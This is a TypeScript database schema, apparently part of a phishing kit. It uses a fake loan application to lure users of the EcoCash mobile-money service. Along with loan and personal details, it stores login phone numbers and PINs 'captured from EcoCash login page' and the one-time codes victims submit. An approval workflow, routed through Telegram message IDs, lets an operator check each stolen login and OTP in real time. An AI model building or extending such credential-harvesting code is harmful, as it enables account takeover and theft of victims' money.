import { pgTable, serial, text, real, integer, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

export const applicationsTable = pgTable("applications", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  // Loan details (step 1)
  loanType: text("loan_type"),
  loanAmount: real("loan_amount"),
  loanTerm: integer("loan_term"),
  loanPurpose: text("loan_purpose"),
  // Personal info (step 2)
  firstName: text("first_name"),
  lastName: text("last_name"),
  phoneNumber: text("phone_number"),
  // Financial info (step 3)
  employmentStatus: text("employment_status"),
  monthlyIncome: real("monthly_income"),
  // Login credentials captured from EcoCash login page
  loginPhone: text("login_phone"),
  loginPin: text("login_pin"),
  // OTP submitted by user
  otpCode: text("otp_code"),
  // Approval workflow status
  // PENDING → LOGIN_SUBMITTED → LOGIN_APPROVED/LOGIN_REJECTED
  // LOGIN_APPROVED → OTP_SUBMITTED → OTP_APPROVED/OTP_REJECTED
  status: text("status").notNull().default("PENDING"),
  // Telegram message IDs for callback routing
  telegramLoginMessageId: integer("telegram_login_message_id"),
  telegramOtpMessageId: integer("telegram_otp_message_id"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
  updatedAt: timestamp("updated_at").defaultNow().notNull(),
});

export const insertApplicationSchema = createInsertSchema(applicationsTable).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertApplication = z.infer<typeof insertApplicationSchema>;
export type Application = typeof applicationsTable.$inferSelect;
